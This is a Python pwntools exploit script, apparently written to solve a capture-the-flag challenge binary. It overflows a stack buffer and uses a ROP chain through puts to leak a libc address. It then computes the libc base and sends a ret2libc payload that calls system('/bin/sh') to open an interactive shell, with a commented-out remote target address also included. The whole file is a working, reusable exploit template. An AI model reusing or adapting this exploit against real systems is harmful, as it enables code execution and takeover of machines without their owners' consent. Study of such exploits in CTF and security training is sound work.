from pwn import *
bin= './chall'
libc=ELF('./libc-2.31.so')
elf=ELF(bin)
rop=ROP(elf)
r=elf.process()
#r = remote('34.143.130.87',4097)
offset_pl = b'a'*56
main=elf.symbols['main']
start=elf.symbols['_start']
#win_add=elf.symbols['win']
#ret_main=0x401315 
libc_function='puts'
PUTS_PLT=elf.symbols[libc_function]
pop_rdi_add = (rop.find_gadget(['pop rdi', 'ret']))[0]
def get_addr(libc_func):
    FUNC_GOT = elf.got[libc_func]
    log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = p64(pop_rdi_add) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(start)
    r.sendline(b'a'*56+rop1)
    r.sendline(b'a')
    r.recvuntil(b'xt\n')
    #print(b'heheh'+r.recvuntil(b'xt\n'))
    leak = u64(r.recvuntil(b'\n',drop=True).ljust(8, b"\x00"))
    log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")
    # Set lib base address
    if libc:
       log.info(f"LIBC offset  {libc_func}: {hex(libc.symbols[libc_func])}")
       libc.address = leak - libc.symbols[libc_func] #Save LIBC base
       # print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
       log.info("LIBC base @ %s" % hex(libc.address))
  
get_addr(libc_function) #Search for puts address in memmory to obtain LIBC base
system_add=libc.symbols['system']
exit_add=libc.symbols['exit']
ret=rop.find_gadget(['ret'])[0]
binsh_add=next(libc.search(b'/bin/sh\x00'))
flag=b'cat /home/ctf/flag.txt'
# log.success('Win_add :'+hex(win_add))
log.success('binsh_add :'+hex(binsh_add))
log.success('Pop_rdi_add :'+hex(pop_rdi_add))
log.success('Ret_gadget_add :'+hex(ret))
log.success('Sys_add :'+hex(system_add))
log.success('Exit_add :'+hex(exit_add))
pl= b'a'*56 + p64(pop_rdi_add) + p64(binsh_add) +p64(ret)+ p64(system_add) #+p64(exit_add)
r.sendline(pl)
#r.sendline(offset_pl+p64(start))
r.interactive()
